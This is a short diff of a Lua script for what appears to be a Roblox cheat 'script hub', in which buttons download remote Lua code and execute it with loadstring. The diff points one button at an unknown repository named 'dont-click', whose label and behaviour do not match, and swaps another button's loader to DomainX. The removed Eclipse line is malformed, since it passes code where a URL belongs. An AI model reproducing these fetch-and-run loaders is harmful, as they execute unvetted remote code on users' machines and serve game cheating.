@@ -105,8 +105,8 @@ ExtraHub.Font = Enum.Font.SourceSansBold
 ExtraHub.Text = "Extra Hub"
 ExtraHub.TextColor3 = Color3.fromRGB(0, 255, 255)
 ExtraHub.TextSize = 27.000
-InfiniteYield.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+ExtraHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/bruhtherlol/dont-click/main/main/oh'))()
 end)
 
 EclipseHub.Name = "EclipseHub"
@@ -118,11 +118,11 @@ EclipseHub.Position = UDim2.new(0.312149525, 0, 0.0247349832, 0)
 EclipseHub.Size = UDim2.new(0, 200, 0, 50)
 EclipseHub.Style = Enum.ButtonStyle.RobloxButtonDefault
 EclipseHub.Font = Enum.Font.SourceSansBold
-EclipseHub.Text = "Eclipse Hub"
+EclipseHub.Text = "DomainX"
 EclipseHub.TextColor3 = Color3.fromRGB(255, 183, 0)
 EclipseHub.TextSize = 27.000
 EclipseHub.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('getgenv().mainKey = "nil"local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
 
 		
 end)
